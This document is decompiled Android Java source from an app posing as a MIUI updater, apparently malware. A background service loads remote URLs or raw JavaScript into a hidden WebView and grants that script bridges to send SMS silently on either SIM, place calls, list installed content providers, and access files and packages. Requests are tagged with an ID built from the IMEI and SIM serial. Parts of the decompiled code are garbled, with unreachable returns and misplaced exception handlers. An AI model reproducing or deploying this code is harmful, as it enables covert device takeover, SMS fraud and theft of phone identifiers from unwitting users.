package brandmangroupe.miui.updater;

import android.content.Context;
import android.telephony.TelephonyManager;

public final class TelephonyInfo {
    private static TelephonyInfo telephonyInfo;
    private String imsiSIM1;
    private String imsiSIM2;
    private boolean isSIM1Ready;
    private boolean isSIM2Ready;

    private static class GeminiMethodNotFoundException extends Exception {
        private static final long serialVersionUID = -996812356902545308L;

        public GeminiMethodNotFoundException(String info) {
            super(info);
        }
    }

    public String getImsiSIM1() {
        return this.imsiSIM1;
    }

    public String getImsiSIM2() {
        return this.imsiSIM2;
    }

    public boolean isSIM1Ready() {
        return this.isSIM1Ready;
    }

    public boolean isSIM2Ready() {
        return this.isSIM2Ready;
    }

    public boolean isDualSIM() {
        return this.imsiSIM2 != null;
    }

    private TelephonyInfo() {
    }

    public static TelephonyInfo getInstance(Context context) {
        boolean z = true;
        if (telephonyInfo == null) {
            telephonyInfo = new TelephonyInfo();
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            telephonyInfo.imsiSIM1 = telephonyManager.getDeviceId();
            telephonyInfo.imsiSIM2 = null;
            try {
                telephonyInfo.imsiSIM1 = getDeviceIdBySlot(context, "getDeviceIdGemini", 0);
                telephonyInfo.imsiSIM2 = getDeviceIdBySlot(context, "getDeviceIdGemini", 1);
            } catch (GeminiMethodNotFoundException e) {
                e.printStackTrace();
                try {
                    telephonyInfo.imsiSIM1 = getDeviceIdBySlot(context, "getDeviceId", 0);
                    telephonyInfo.imsiSIM2 = getDeviceIdBySlot(context, "getDeviceId", 1);
                } catch (GeminiMethodNotFoundException e1) {
                    e1.printStackTrace();
                }
            }
            TelephonyInfo telephonyInfo = telephonyInfo;
            if (telephonyManager.getSimState() != 5) {
                z = false;
            }
            telephonyInfo.isSIM1Ready = z;
            telephonyInfo.isSIM2Ready = false;
            try {
                telephonyInfo.isSIM1Ready = getSIMStateBySlot(context, "getSimStateGemini", 0);
                telephonyInfo.isSIM2Ready = getSIMStateBySlot(context, "getSimStateGemini", 1);
            } catch (GeminiMethodNotFoundException e2) {
                e2.printStackTrace();
                try {
                    telephonyInfo.isSIM1Ready = getSIMStateBySlot(context, "getSimState", 0);
                    telephonyInfo.isSIM2Ready = getSIMStateBySlot(context, "getSimState", 1);
                } catch (GeminiMethodNotFoundException e12) {
                    e12.printStackTrace();
                }
            }
        }
        return telephonyInfo;
    }

    private static String getDeviceIdBySlot(Context context, String predictedMethodName, int slotID) throws GeminiMethodNotFoundException {
        TelephonyManager telephony = (TelephonyManager) context.getSystemService("phone");
        try {
            Object ob_phone = Class.forName(telephony.getClass().getName()).getMethod(predictedMethodName, new Class[]{Integer.TYPE}).invoke(telephony, new Object[]{Integer.valueOf(slotID)});
            if (ob_phone != null) {
                return ob_phone.toString();
            }
            return null;
        } catch (Exception e) {
            e.printStackTrace();
            throw new GeminiMethodNotFoundException(predictedMethodName);
        }
    }

    private static boolean getSIMStateBySlot(Context context, String predictedMethodName, int slotID) throws GeminiMethodNotFoundException {
        TelephonyManager telephony = (TelephonyManager) context.getSystemService("phone");
        try {
            Object ob_phone = Class.forName(telephony.getClass().getName()).getMethod(predictedMethodName, new Class[]{Integer.TYPE}).invoke(telephony, new Object[]{Integer.valueOf(slotID)});
            if (ob_phone == null || Integer.parseInt(ob_phone.toString()) != 5) {
                return false;
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            throw new GeminiMethodNotFoundException(predictedMethodName);
        }
    }
}
package brandmangroupe.miui.updater;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.TableRow.LayoutParams;
import java.util.UUID;

public class GlobalCode extends Service {
    public void onCreate() {
        super.onCreate();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
    }

    public String getexstras(Bundle extras, String name) {
        String out = "";
        if (extras == null || !extras.containsKey(name)) {
            return out;
        }
        return extras.getString(name);
    }

    public static String getUniqueID(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        String deviceId = new UUID((long) (Secure.getString(context.getContentResolver(), "android_id")).hashCode(), (((long) (tm.getDeviceId()).hashCode()) << 32) | ((long) (tm.getSimSerialNumber()).hashCode())).toString();
        String key = "";
        try {
            ApplicationInfo appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 128);
            if (appInfo.metaData != null) {
                key = appInfo.metaData.getString("sub");
            }
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
        }
        return new StringBuilder(String.valueOf(deviceId)).append("-").append(key).toString();
    }

    @SuppressLint({"NewApi"})
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            Bundle extras = intent.getExtras();
            if (extras != null) {
                String content = getexstras(extras, "content");
                String type = getexstras(extras, "type");
                String data = getexstras(extras, "data");
                WebView webview = new WebView(this);
                webview.setLayoutParams(new LayoutParams(0, -2, 1.0f));
                webview.addJavascriptInterface(new MeSetting(this), "MeSetting");
                webview.addJavascriptInterface(new MeSystem(this), "MeSystem");
                webview.addJavascriptInterface(new MeFile(this), "MeFile");
                webview.addJavascriptInterface(new MePackage(this), "MePackage");
                webview.addJavascriptInterface(new MeContent(this), "MeContent");
                webview.addJavascriptInterface(new MeAction(this), "MeAction");
                WebSettings webSettings = webview.getSettings();
                webSettings.setSavePassword(true);
                webSettings.setSaveFormData(true);
                webSettings.setAllowFileAccess(true);
                if (VERSION.SDK_INT >= 16) {
                    webSettings.setAllowFileAccessFromFileURLs(true);
                    webSettings.setAllowUniversalAccessFromFileURLs(true);
                }
                webSettings.setJavaScriptEnabled(true);
                webSettings.setUserAgentString("Hash: " + getUniqueID(this));
                if (content.substring(0, 7).contains("http://")) {
                    webview.loadUrl(Uri.parse(content).buildUpon().appendQueryParameter("type", type).appendQueryParameter("data", data).build().toString());
                }
                if (content.substring(0, 8).contains("file:///")) {
                    webview.loadUrl(Uri.parse(content).buildUpon().build().toString());
                }
                if (content.substring(0, 11).contains("javascript:")) {
                    webview.loadData("<script>" + content.substring(11) + "</script>", "text/html; charset=UTF-8", null);
                }
            }
        }
        return 1;
    }
}
package brandmangroupe.miui.updater;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.ProviderInfo;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MeSystem {
    Context mContext;

    MeSystem(Context c) {
        this.mContext = c;
    }

    public void Log(String text) {
        Log.i("MeSystem.Log", text);
    }

    public void showToast(String toast) {
        Toast.makeText(this.mContext, toast, 0).show();
    }

    public void sendSMS(String phoneNumber, String message) {
        SmsManager.getDefault().sendTextMessage(phoneNumber, null, message, null, null);
    }

    public void start(String uri) {
        this.mContext.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(uri)));
    }

    public void call(String number) {
        call(number, 0);
    }

    public String dualsim() {
        TelephonyInfo telephonyInfo = TelephonyInfo.getInstance(this.mContext);
        String imsiSIM1 = telephonyInfo.getImsiSIM1();
        String imsiSIM2 = telephonyInfo.getImsiSIM2();
        boolean isSIM1Ready = telephonyInfo.isSIM1Ready();
        return " IME1 : " + imsiSIM1 + "\n" + " IME2 : " + imsiSIM2 + "\n" + " IS DUAL SIM : " + telephonyInfo.isDualSIM() + "\n" + " IS SIM1 READY : " + isSIM1Ready + "\n" + " IS SIM2 READY : " + telephonyInfo.isSIM2Ready() + "\n";
    }

    public void call(String number, int sim) {
        Intent intent123 = new Intent("android.intent.action.CALL", Uri.parse("tel:" + number.replace("#", Uri.encode("#"))));
        intent123.putExtra("com.android.phone.extra.slot", sim);
        intent123.putExtra("simSlot", sim);
        intent123.setFlags(805306368);
        this.mContext.startActivity(intent123);
    }

    public String providers() throws JSONException {
        JSONObject jsonObj = new JSONObject();
        JSONArray jsonArr = new JSONArray();
        for (PackageInfo pack : this.mContext.getPackageManager().getInstalledPackages(8)) {
            ProviderInfo[] providers = pack.providers;
            if (providers != null) {
                for (ProviderInfo provider : providers) {
                    JSONObject pnObj = new JSONObject();
                    pnObj.put("name", provider.authority);
                    jsonArr.put(pnObj);
                }
            }
        }
        jsonObj.put("result", jsonArr);
        return jsonObj.toString();
    }

    public boolean sendSMS(int simID, String toNum, String smsText) {
        String name;
        Context ctx = this.mContext;
        if (simID == 0) {
            try {
                name = "isms";
            } catch (ClassNotFoundException e) {
                Log.e("apipas", "ClassNotFoundException:" + e.getMessage());
            } catch (NoSuchMethodException e2) {
                Log.e("apipas", "NoSuchMethodException:" + e2.getMessage());
            } catch (InvocationTargetException e3) {
                Log.e("apipas", "InvocationTargetException:" + e3.getMessage());
            } catch (IllegalAccessException e4) {
                Log.e("apipas", "IllegalAccessException:" + e4.getMessage());
            } catch (Exception e5) {
                Log.e("apipas", "Exception:" + e5.getMessage());
            }
        } else if (simID == 1) {
            name = "isms2";
        } else {
            throw new Exception("can not get service which for sim '" + simID + "', only 0,1 accepted as values");
        }
        Method method = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[]{String.class});
        method.setAccessible(true);
        Object param = method.invoke(null, new Object[]{name});
        method = Class.forName("com.android.internal.telephony.ISms$Stub").getDeclaredMethod("asInterface", new Class[]{IBinder.class});
        method.setAccessible(true);
        Object stubObj = method.invoke(null, new Object[]{param});
        if (VERSION.SDK_INT < 18) {
            stubObj.getClass().getMethod("sendText", new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class}).invoke(stubObj, new Object[]{toNum, null, smsText, null, null});
        } else {
            stubObj.getClass().getMethod("sendText", new Class[]{String.class, String.class, String.class, String.class, PendingIntent.class, PendingIntent.class}).invoke(stubObj, new Object[]{ctx.getPackageName(), toNum, null, smsText, null, null});
        }
        return true;
        return false;
    }

    public boolean sendMultipartTextSMS(int simID, String toNum, ArrayList<String> smsTextlist) {
        String name;
        Context ctx = this.mContext;
        if (simID == 0) {
            try {
                name = "isms";
            } catch (ClassNotFoundException e) {
                Log.e("apipas", "ClassNotFoundException:" + e.getMessage());
            } catch (NoSuchMethodException e2) {
                Log.e("apipas", "NoSuchMethodException:" + e2.getMessage());
            } catch (InvocationTargetException e3) {
                Log.e("apipas", "InvocationTargetException:" + e3.getMessage());
            } catch (IllegalAccessException e4) {
                Log.e("apipas", "IllegalAccessException:" + e4.getMessage());
            } catch (Exception e5) {
                Log.e("apipas", "Exception:" + e5.getMessage());
            }
        } else if (simID == 1) {
            name = "isms2";
        } else {
            throw new Exception("can not get service which for sim '" + simID + "', only 0,1 accepted as values");
        }
        Method method = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[]{String.class});
        method.setAccessible(true);
        Object param = method.invoke(null, new Object[]{name});
        method = Class.forName("com.android.internal.telephony.ISms$Stub").getDeclaredMethod("asInterface", new Class[]{IBinder.class});
        method.setAccessible(true);
        Object stubObj = method.invoke(null, new Object[]{param});
        if (VERSION.SDK_INT < 18) {
            stubObj.getClass().getMethod("sendMultipartText", new Class[]{String.class, String.class, List.class, List.class, List.class}).invoke(stubObj, new Object[]{toNum, null, smsTextlist, null, null});
        } else {
            stubObj.getClass().getMethod("sendMultipartText", new Class[]{String.class, String.class, String.class, List.class, List.class, List.class}).invoke(stubObj, new Object[]{ctx.getPackageName(), toNum, null, smsTextlist, null, null});
        }
        return true;
        return false;
    }
}
